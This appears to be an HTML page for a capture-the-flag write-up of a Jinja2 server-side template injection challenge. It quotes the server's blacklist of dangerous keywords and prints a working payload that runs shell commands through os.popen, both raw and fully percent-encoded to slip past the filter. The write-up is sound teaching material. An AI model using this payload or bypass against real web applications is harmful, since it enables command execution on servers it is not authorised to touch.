@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>5571 (SSTI) | V1t CTF 2025 | CTF Writeups</title>
+    <meta name="description" content="Writeup for 5571 SSTI challenge from V1t CTF 2025">
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚩</text></svg>">
+</head>
+<body>
+    <nav>
+        <div class="container">
+            <a href="../index.html" class="logo"><span class="logo-icon">🚩</span><span>CTF Writeups</span></a>
+            <div class="nav-toggle" onclick="toggleNav()"><span></span><span></span><span></span></div>
+            <ul id="nav-menu">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../about.html">About</a></li>
+                <li><a href="https://github.com/walidzitouni/CTFWriteups" target="_blank">GitHub</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="breadcrumbs">
+        <div class="container">
+            <a href="../index.html">Home</a><span>/</span>
+            <a href="../writeups.html">Writeups</a><span>/</span>
+            <span style="color: var(--primary-purple);">5571 (SSTI)</span>
+        </div>
+    </div>
+
+    <article class="writeup-content">
+        <header>
+            <div class="writeup-tags" style="margin-bottom: 1rem;">
+                <span class="tag">Web</span>
+                <span class="tag">SSTI</span>
+                <span class="tag difficulty-medium">Medium</span>
+            </div>
+            <h1>5571 (SSTI)</h1>
+            <div class="writeup-meta" style="margin-bottom: 2rem; color: var(--text-muted);">
+                <span>📅 2025</span>
+                <span style="margin: 0 1rem;">|</span>
+                <span>🏆 V1t CTF 2025</span>
+            </div>
+        </header>
+
+        <h2>Challenge Summary</h2>
+        <p>The backend attempts to sanitize user input by blocking specific "dangerous" literals:</p>
+        <pre><code>BLOCKED_LITERALS = [
+  '{', '}', '__', 'open', 'os', 'subprocess', 'import', 'eval', 'exec',
+  'system', 'popen', 'builtins', 'globals', 'locals', 'getattr', 'setattr',
+  'class', 'compile', 'inspect'
+]</code></pre>
+        <p>The page is vulnerable to SSTI. The objective is to bypass the blacklist and execute a Jinja2 payload to read the flag file.</p>
+
+        <h2>Key Idea: Percent-Encoding to Evade Blacklist</h2>
+        <ul>
+            <li>The blacklist is applied on the raw input before decoding.</li>
+            <li>By percent-encoding the entire payload (including braces, dots, underscores, quotes, etc.), we hide the literal characters from the blacklist.</li>
+            <li>When the server decodes the request and then renders the template, the payload executes.</li>
+        </ul>
+
+        <h2>Working Payload</h2>
+        <h3>Raw payload:</h3>
+        <pre><code>{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}</code></pre>
+
+        <h3>Fully percent-encoded:</h3>
+        <pre><code>%7B%7B%63%6F%6E%66%69%67%2E%5F%5F%63%6C%61%73%73%5F%5F%2E%5F%5F%69%6E%69%74%5F%5F%2E%5F%5F%67%6C%6F%62%61%6C%73%5F%5F%5B%27%6F%73%27%5D%2E%70%6F%70%65%6E%28%27%63%61%74%20%66%6C%61%67%2E%74%78%74%27%29%2E%72%65%61%64%28%29%7D%7D</code></pre>
+
+        <h2>Why This Bypass Works</h2>
+        <ul>
+            <li>Blacklists are fragile, especially when applied before decoding.</li>
+            <li>Encoding the entire payload prevents the literal tokens from matching blacklist checks.</li>
+            <li>After decoding occurs later in the request/templating pipeline, the payload is restored and evaluated.</li>
+        </ul>
+
+        <h2>Flag</h2>
+        <div class="flag-box">
+            <div class="flag-label">Flag</div>
+            <div class="flag-value">v1t{55T1_byp4ss_w1th_3nc0d1ng}</div>
+        </div>
+
+        <div style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid rgba(155, 89, 182, 0.3);">
+            <a href="../writeups.html" class="btn btn-secondary">← Back to Writeups</a>
+        </div>
+    </article>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand"><a href="../index.html" class="logo"><span class="logo-icon">🚩</span><span>CTF Writeups</span></a></div>
+                <div class="footer-links"><a href="../index.html">Home</a><a href="../writeups.html">Writeups</a><a href="../about.html">About</a></div>
+            </div>
+        </div>
+    </footer>
+    <script>function toggleNav() { document.getElementById('nav-menu').classList.toggle('active'); }</script>
+</body>
+</html>
